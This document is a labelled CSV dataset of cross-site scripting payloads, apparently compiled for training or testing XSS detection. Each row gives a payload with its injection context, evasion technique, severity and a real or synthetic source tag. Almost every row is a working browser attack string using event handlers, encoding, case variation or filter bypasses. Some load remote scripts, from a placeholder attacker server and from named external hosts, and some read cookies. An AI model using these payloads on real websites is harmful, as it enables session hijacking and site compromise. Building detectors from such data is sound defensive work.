payload,context,technique,severity,length,source
""" onfocus=confirm(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,50,synthetic
<button popovertarget=x>Click me</button><dl ontoggle=alert(1) popover id=x>AnonKryptiQuz</dl>,event_handler,none,medium,94,real
<svG oNerRor=prOmpT(1)/>,tag_injection,synthetic,medium,24,synthetic
"<svg onclick=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,61,synthetic
<script>console.log`location.hash`</script>,script_injection,synthetic,medium,43,synthetic
""" onfocus=alert('XSS') autofocus=""",attribute_escape,synthetic,medium,34,synthetic
"<u onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</u>",event_handler,none,medium,75,real
"<style>@keyframes x{}</style><output style=""animation-name:x"" onwebkitanimationend=""alert(1)""></output>",event_handler,none,medium,103,real
"<img src=""x:%90"" title=""onerror=alert(1)//"">",event_handler,url_encoding,medium,44,real
<picture contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,61,real
"""><Svg onFocUs=ConFirM('XSS')>",tag_injection,synthetic,medium,30,synthetic
"<style>:target {color: red;}</style><var id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></var>",event_handler,none,medium,109,real
"<slot onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</slot>",event_handler,none,medium,69,real
<svg on&#101;rror=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,49,synthetic
<scRipT>/*/cOnsOle.loG(dOcuMenT.dOmaIn)</sCriPt>,script_injection,synthetic,medium,48,synthetic
"<track id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></track>",event_handler,none,medium,86,real
"<animatemotion draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",event_handler,none,medium,102,real
"<form onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</form>",event_handler,none,medium,66,real
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></legend>",event_handler,none,medium,115,real
<address onpointerout=alert(1) style=display:block>AnonKryptiQuz</address>,event_handler,none,medium,74,real
<video onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
<applet onpointerout=alert(1) style=display:block>AnonKryptiQuz</applet>,event_handler,none,medium,72,real
"<area onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</area>",event_handler,none,medium,67,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></head>",event_handler,none,medium,178,real
"<aside oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
<svg onfocus=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,48,synthetic
"<svg onmousemove=""alert(1)"">AnonKryptiQuz</svg>",event_handler,none,medium,47,real
"<select onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</select>",event_handler,none,medium,65,real
<svg onload=console.log(1)>,tag_injection,synthetic,medium,27,synthetic
<var onblur=alert(1) tabindex=1 id=x></var><input autofocus>,event_handler,none,medium,60,real
<svg on&#101;rror=confirm(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,54,synthetic
<script>confirm`'XSS'`</script>,script_injection,synthetic,medium,31,synthetic
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;,generic,html_entity,low,49,real
"<a href=""jav&#x61script:alert(3)"">a</a>",attribute_escape,html_entity,medium,39,real
"<video onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</video>",event_handler,none,medium,65,real
<custom tags onpointerout=alert(1) style=display:block>AnonKryptiQuz</custom tags>,event_handler,none,medium,82,real
<SCRI<script>PT>alert(1);</SCR</script>IPT>,script_injection,case_variation,medium,43,real
"EvaL(""ProMpt(StRinG.fRomChaRCoDe(88,83,83))"")",dom_sink,synthetic,medium,45,synthetic
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",script_injection,encoding|case_variation,medium,68,real
"<spacer oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<dialog oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",event_handler,none,medium,64,real
<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>,event_handler,none,medium,48,real
<svg onfocus=alert(document.domain)>,tag_injection,synthetic,medium,36,synthetic
"<style>:target {color: red;}</style><output id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></output>",event_handler,none,medium,115,real
"<a href=""javas\x0Dcript:javascript:alert(5613)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
%22><svg onload=console.log(%27XSS%27)>,tag_injection,synthetic,medium,39,synthetic
<nobr onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
<content onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,event_handler,html_entity,low,47,real
"<div draggable=""true"" contenteditable>drag me</div><head ondrop=alert(1) contenteditable style=display:block>drop here</head>",event_handler,none,medium,125,real
>><marquee loop=1 width=0 onfinish=alert(1)>,event_handler,none,medium,44,real
"<TABLE BACKGROUND=""javascript:alert(3412)"">",js_uri,case_variation,medium,43,real
<script>//alert(document.domain)</script>,script_injection,synthetic,medium,41,synthetic
%3Csvg onclick=console.log('XSS')%3E,tag_injection,synthetic,medium,36,synthetic
"<details onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</details>",event_handler,none,medium,72,real
j&#97;v&#97;script:void(confirm(loc&#97;tion.h&#97;sh)),js_uri,synthetic,medium,55,synthetic
<label onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme,event_handler,unicode_escape,low,62,real
"<bgsound onmouseout=""alert(1)"">AnonKryptiQuz</bgsound>",event_handler,none,medium,54,real
"Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>",script_injection,none,medium,237,real
<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>,event_handler,none,medium,82,real
"<select onmouseleave=""alert(1)"">AnonKryptiQuz</select>",event_handler,none,medium,54,real
<audio onpointerup=alert(1) style=display:block>AnonKryptiQuz</audio>,event_handler,none,medium,69,real
%3Csvg ontoggle=confirm(document.domain)/%3E,tag_injection,synthetic,medium,44,synthetic
"<sub onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></sub>",event_handler,none,medium,279,real
"javascript:""/*'/*`/*\"" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>",event_handler,comment_injection,medium,143,real
"<picture onclick=""alert(1)"">AnonKryptiQuz</picture>",event_handler,none,medium,51,real
"<style>@keyframes slidein {}</style><thead style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></thead>",event_handler,none,medium,170,real
"<IMG SRC=x onunload=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,59,real
<!--[if]><script>javascript:alert(5746)</script -->,script_injection,comment_injection,medium,51,real
<script>\u0061lert`document.domain`</script>,script_injection,synthetic,medium,44,synthetic
%22 onclick=console.log(document.cookie) %22,attribute_escape,synthetic,medium,44,synthetic
"<area draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</area>",event_handler,none,medium,84,real
<tfoot onpointerup=alert(1) style=display:block>AnonKryptiQuz</tfoot>,event_handler,none,medium,69,real
<style onpointerdown=alert(1) style=display:block>AnonKryptiQuz</style>,event_handler,none,medium,71,real
"<dialog onmouseout=""alert(1)"">AnonKryptiQuz</dialog>",event_handler,none,medium,52,real
<sup onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"<video onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</video>",event_handler,none,medium,66,real
<object data=javascript:alert(1)>,js_uri,none,medium,33,real
"<shadow draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</shadow>",event_handler,none,medium,90,real
<param onpointermove=alert(1) style=display:block>AnonKryptiQuz</param>,event_handler,none,medium,71,real
%27 onclick=alert(1) %27,attribute_escape,synthetic,medium,24,synthetic
"<style>@keyframes x{}</style><label style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></label>",event_handler,none,medium,103,real
<button popovertarget=x>Click me</button><frameset ontoggle=alert(1) popover id=x>AnonKryptiQuz</frameset>,event_handler,none,medium,106,real
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,event_handler,comment_injection,medium,57,real
<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>,event_handler,none,medium,60,real
"""><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(1)>",tag_injection,synthetic,medium,55,synthetic
<header onpointerup=alert(1) style=display:block>AnonKryptiQuz</header>,event_handler,none,medium,71,real
"<style>:target {color: red;}</style><q id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></q>",event_handler,none,medium,105,real
<svg onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,60,synthetic
<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>,event_handler,none,medium,79,real
"<style>:target {color:red;}</style><tt id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></tt>",event_handler,none,medium,108,real
"<p onclick=""alert(1)"">AnonKryptiQuz</p>",event_handler,none,medium,39,real
"<figure onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</figure>",event_handler,none,medium,85,real
<svg onmous&#101;ov&#101;r=&#97;l&#101;rt(1)>,tag_injection,synthetic,medium,45,synthetic
%3Csvg onmouseenter=confirm('XSS')/%3E,tag_injection,synthetic,medium,38,synthetic
"%3Cscript%3E/*/alert(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,medium,64,synthetic
<figure onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</figure>,event_handler,none,medium,78,real
"<script src=""//brutelogic.com.br&sol;1.js&num;",script_injection,none,low,46,real
"<html oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,98,real
"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>",event_handler,none,medium,117,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=""position:absolute;"" onanimationcancel=""print()""></sub>",event_handler,none,low,175,real
<svg%09%0a%0b%0c%0d%a0%00%20onload=alert (1)>,event_handler,url_encoding,low,45,real
*/</script><script>alert()/*,script_injection,none,medium,28,real
"<rp onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></rp>",event_handler,none,medium,277,real
"#""'><svg/onload=confirm(666)>",event_handler,none,medium,29,real
<svG oNerRor=coNfiRm(DocUmeNt.DomAin)/>,tag_injection,synthetic,medium,39,synthetic
confirm(document.location),dom_sink,none,medium,26,real
"<content oncontextmenu=""alert(1)"">AnonKryptiQuz</content>",event_handler,none,medium,57,real
"<style>:target {transform: rotate(180deg);}</style><input id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></input>",event_handler,none,medium,128,real
"<meter onmouseover=""alert(1)"">AnonKryptiQuz</meter>",event_handler,none,medium,51,real
JavAscRipT:aLerT(1),js_uri,synthetic,medium,19,synthetic
javascript:void(prompt('XSS')),js_uri,synthetic,medium,30,synthetic
"<rp onmouseout=""alert(1)"">AnonKryptiQuz</rp>",event_handler,none,medium,44,real
<svg onmouseover=\u0061lert('XSS')>,tag_injection,synthetic,medium,35,synthetic
"<strong ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</strong>",event_handler,none,medium,93,real
"ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(8003)"">DEF",js_uri,none,medium,67,real
"<tt onclick=""alert(1)"">AnonKryptiQuz</tt>",event_handler,none,medium,41,real
"onload=""alert(1)""",event_handler,none,medium,17,real
JavAscRipT:pRomPt('XSS'),js_uri,synthetic,medium,24,synthetic
<title id=x tabindex=1 onfocusin=alert(1)></title>,event_handler,none,medium,50,real
"<figcaption onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</figcaption>",event_handler,none,medium,79,real
""" onfocus=prompt(document.cookie) """,attribute_escape,synthetic,medium,35,synthetic
%22onauxclick=alert`AnonKryptiQuz`+a,event_handler,url_encoding,low,36,real
"<hgroup onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</hgroup>",event_handler,none,medium,87,real
"<html onMouseOut html onMouseOut=""javascript:javascript:alert(9460)""></html onMouseOut>",event_handler,none,medium,87,real
<hr contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,56,real
"<div draggable=""true"" contenteditable>drag me</div><col ondragover=alert(1) contenteditable style=display:block>drop here</col>",event_handler,none,medium,127,real
<u onpointerleave=alert(1) style=display:block>AnonKryptiQuz</u>,event_handler,none,medium,64,real
"&#00;</form><input type&#61;""date"" onfocus=""alert(6317)"">",event_handler,html_entity,medium,57,real
<svg onmous&#101;&#101;nt&#101;r=confirm(1)>,tag_injection,synthetic,medium,44,synthetic
<footer onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,68,real
"<article onmouseleave=""alert(1)"">AnonKryptiQuz</article>",event_handler,none,medium,56,real
"<center onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</center>",event_handler,none,medium,70,real
"<style>:target {color: red;}</style><form id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></form>",event_handler,none,medium,111,real
"<style>@keyframes x{}</style><param style=""animation-name:x"" onanimationend=""alert(1)""></param>",event_handler,none,medium,95,real
<meta onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</meta>,event_handler,none,medium,74,real
"<marquee onStart marquee onStart=""javascript:javascript:alert(9723)""></marquee onStart>",event_handler,none,medium,87,real
"<dialog onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",event_handler,none,medium,68,real
"<form draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</form>",event_handler,none,medium,86,real
<meta id=x tabindex=1 onfocusin=alert(1) style=display:block></meta>,event_handler,none,medium,68,real
"<title onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</title>",event_handler,none,medium,69,real
""";[][“\146\151\154\164\145\162”][“\143\157\156\163\164\162\165\143\164\157\162”](“\145\166\141\154\50\141\164\157\142\50\42\131\127\170\154\143\156\121\157\115\123\153\75\42\51\51”)();var+AnonKryptiQuz=""",event_handler,none,low,203,real
"<frameset onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",event_handler,none,medium,78,real
"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",event_handler,none,medium,160,real
"<img src=a onerror=""var x=document.createElement('script');x.src='<attacker_server>/api.js';document.body.appendChild(x);"">",event_handler,none,high,123,real
"<img onload=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,49,synthetic
<cite onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"<frame onclick=""alert(1)"">AnonKryptiQuz</frame>",event_handler,none,medium,47,real
"<script>eval(atob(""YWxlcnQoZG9jdW1lbnQuY29va2llKQ==""))<script>",script_injection,encoding,high,62,real
<svG oNmoUseEntEr=ConFirM('XSS')/>,tag_injection,synthetic,medium,34,synthetic
<svg onclick=consol&#101;.log(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,57,synthetic
<button popovertarget=x>Click me</button><object onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</object>,event_handler,none,medium,108,real
"<div draggable=""true"" contenteditable>drag me</div><data ondragover=alert(1) contenteditable style=display:block>drop here</data>",event_handler,none,medium,129,real
%27 onbegin=alert(%27XSS%27) %27,attribute_escape,synthetic,medium,32,synthetic
"<basefont draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</basefont>",event_handler,none,medium,74,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figure>",event_handler,none,medium,182,real
""" oNerRor=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape,synthetic,medium,50,synthetic
"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionstart=alert(1)></picture>",event_handler,none,medium,114,real
<caption contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,61,real
"<dir onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</dir>",event_handler,none,medium,67,real
"<style>:target {transform: rotate(180deg);}</style><option id=x style=""transition:transform 2s"" ontransitionrun=print()></option>",event_handler,none,low,129,real
"<param oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<noscript oncontextmenu=""alert(1)"">AnonKryptiQuz</noscript>",event_handler,none,medium,59,real
%22><svg onclick=alert(location.hash)>,tag_injection,synthetic,medium,38,synthetic
"<style>@keyframes x{}</style><iframe style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></iframe>",event_handler,none,medium,105,real
"<svg onclick=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,51,synthetic
"<menu onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</menu>",event_handler,none,medium,83,real
"<style>:target {transform: rotate(180deg);}</style><ruby id=x style=""transition:transform 2s"" ontransitionrun=print()></ruby>",event_handler,none,low,125,real
"<button draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</button>",event_handler,none,medium,90,real
"<style>:target {transform: rotate(180deg);}</style><tbody id=x style=""transition:transform 2s"" ontransitionrun=print()></tbody>",event_handler,none,low,127,real
<script id=x tabindex=1 onfocusin=alert(1)></script>,script_injection,none,medium,52,real
<button popovertarget=x>Click me</button><kbd ontoggle=alert(1) popover id=x>AnonKryptiQuz</kbd>,event_handler,none,medium,96,real
<span id=x tabindex=1 onbeforeactivate=alert(1)></span>,event_handler,none,medium,55,real
"<div draggable=""true"" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>",event_handler,none,medium,99,real
%3Csvg onerror=console.log('XSS')/%3E,tag_injection,synthetic,medium,37,synthetic
"<content onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</content>",event_handler,none,medium,87,real
""" onfocus=\u0061lert(location.hash) """,attribute_escape,synthetic,medium,37,synthetic
"<noembed draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,90,real
""" oNtoGglE=cOnfIrm(doCumEnt.coOkiE) """,attribute_escape,synthetic,medium,37,synthetic
<svG oNtoGglE=pRomPt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,36,synthetic
<svg><center onload=alert(1)></center>,event_handler,none,medium,38,real
"eval(""console.log(1)"")",dom_sink,synthetic,medium,22,synthetic
<--`<img/src=` onerror=alert(1)> --!>,event_handler,none,medium,37,real
<span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>,event_handler,none,medium,74,real
%3Csvg onmouseenter=alert(location.hash)%3E,tag_injection,synthetic,medium,43,synthetic
zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//,generic,url_encoding,low,60,real
<scr	ipt>//prompt(location.hash)</scr	ipt>,script_injection,synthetic,medium,42,synthetic
"<style>:target {color: red;}</style><nobr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nobr>",event_handler,none,medium,111,real
"<command ondblclick=""alert(1)"">AnonKryptiQuz</command>",event_handler,none,medium,54,real
<svG oNfoCus=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection,synthetic,medium,43,synthetic
%3Csvg onmouseenter=alert('XSS')%3E,tag_injection,synthetic,medium,35,synthetic
<iframe onblur=alert(1) id=x><input autofocus>,event_handler,none,medium,46,real
"<dl onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</dl>",event_handler,none,medium,59,real
"<hgroup onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</hgroup>",event_handler,none,medium,71,real
"<hr onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,66,real
"<time onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></time>",event_handler,none,medium,281,real
<ins id=x tabindex=1 onfocusin=alert(1)></ins>,event_handler,none,medium,46,real
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",script_injection,none,medium,55,real
<script ~~~>alert(0%0)</script ~~~>,script_injection,none,medium,35,real
"<div draggable=""true"" contenteditable>drag me</div><del ondrop=alert(1) contenteditable style=display:block>drop here</del>",event_handler,none,medium,123,real
<div onpointerenter=alert(1) style=display:block>AnonKryptiQuz</div>,event_handler,none,medium,68,real
"%22 ontoggle=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,55,synthetic
"<map onmouseup=""alert(1)"">AnonKryptiQuz</map>",event_handler,none,medium,45,real
"' onlo&#97;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,61,synthetic
"<svG oNmoUseOveR=pRomPt(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection,synthetic,medium,56,synthetic
"<style>@keyframes x{}</style><marquee style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></marquee>",event_handler,none,medium,107,real
<script>eval('\x61lert(1)')</script>,script_injection,encoding,high,36,real
"<br draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</br>",event_handler,none,medium,77,real
""" onclick=console.log('XSS') """,attribute_escape,synthetic,medium,30,synthetic
' onfocus=\u0061lert('XSS') ',attribute_escape,synthetic,medium,29,synthetic
"<figure onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</figure>",event_handler,none,medium,70,real
%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%3Cscript%3Ealert(1);%3C/script%3E,generic,url_encoding,medium,93,real
"""'><img src=xxx:x \x0Bonerror=javascript:alert(5601)>",event_handler,none,medium,53,real
<progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>,event_handler,none,medium,81,real
&#X003c;,generic,html_entity,low,8,real
'te' ? alert('ifelsesh') : 'xt';,generic,none,medium,32,real
"""><svg onbegin=confirm('XSS')>",tag_injection,synthetic,medium,30,synthetic
"""><svg onmous&#101;&#101;nt&#101;r=prompt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,65,synthetic
"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable style=display:block>drop here</form>",event_handler,none,medium,129,real
<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>,event_handler,none,medium,54,real
<dialog onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
""" onerror=prompt(document.cookie) """,attribute_escape,synthetic,medium,35,synthetic
"<style>@keyframes slidein {}</style><menuitem style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></menuitem>",event_handler,none,medium,170,real
"<svg version=""1.1"" baseProfile=""full"" width=""100"" height=""100"" xmlns=""http://www.w3.org/2000/svg"" onload=""alert('svg attribut')"">",event_handler,none,medium,129,real
</title><SCRIPT>document.vulnerable=true;</script>,script_injection,case_variation,low,50,real
<svg><map onload=alert(1)></map>,event_handler,none,medium,32,real
<img onload=\u0061lert(document.cookie)>,tag_injection,synthetic,medium,40,synthetic
"<article draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</article>",event_handler,none,medium,92,real
"<article onmouseout=""alert(1)"">AnonKryptiQuz</article>",event_handler,none,medium,54,real
&#X000003c,generic,html_entity,low,10,real
<hgroup onpointerup=alert(1) style=display:block>AnonKryptiQuz</hgroup>,event_handler,none,medium,71,real
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></meter>",event_handler,none,medium,103,real
"<style>:target {transform: rotate(180deg);}</style><meta id=x style=""transition:transform 2s"" ontransitionrun=print()></meta>",event_handler,none,low,125,real
<svg onmouseenter=console.log(document.cookie)>,tag_injection,synthetic,medium,47,synthetic
"&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" CONTENT=\""text/html; charset=UTF-7\""&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('AnonKryptiQuz');+ADw-/SCRIPT+AD4-",event_handler,none,medium,159,real
"""/><svg onauxclick=&#x63&#x6F&#x5C&#x75&#x30&#x30&#x36&#x65&#x66&#x69&#x72&#x6D(\\1\\)>",event_handler,html_entity,low,87,real
"<embed onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</embed>",event_handler,none,medium,65,real
"""><svg onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,62,synthetic
<tt onpointermove=alert(1) style=display:block>AnonKryptiQuz</tt>,event_handler,none,medium,65,real
"""%3E%3Cimg onload=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,57,synthetic
' oNfoCus=alErt(1) ',attribute_escape,synthetic,medium,20,synthetic
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onwebkitanimationend=""alert(1)""></shadow>",event_handler,none,medium,103,real
"<plaintext oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,103,real
"<param onmouseenter=""alert(1)"">AnonKryptiQuz</param>",event_handler,none,medium,52,real
"<br onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</br>",event_handler,none,medium,62,real
"""%3E%3Csvg onerror=alert('XSS')%3E",tag_injection,synthetic,medium,34,synthetic
"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->",script_injection,comment_injection|case_variation,low,110,real
<script>/*/\u0061lert('XSS')</script>,script_injection,synthetic,medium,37,synthetic
<input onpointerover=alert(1) style=display:block>AnonKryptiQuz</input>,event_handler,none,medium,71,real
<button popovertarget=x>Click me</button><sup onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</sup>,event_handler,none,medium,102,real
"<style>@keyframes slidein {}</style><head style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></head>",event_handler,none,medium,168,real
javascript:confirm(1)//,js_uri,none,medium,23,real
<!--[if]><script>javascript:alert(1)</script-->,script_injection,comment_injection,medium,47,real
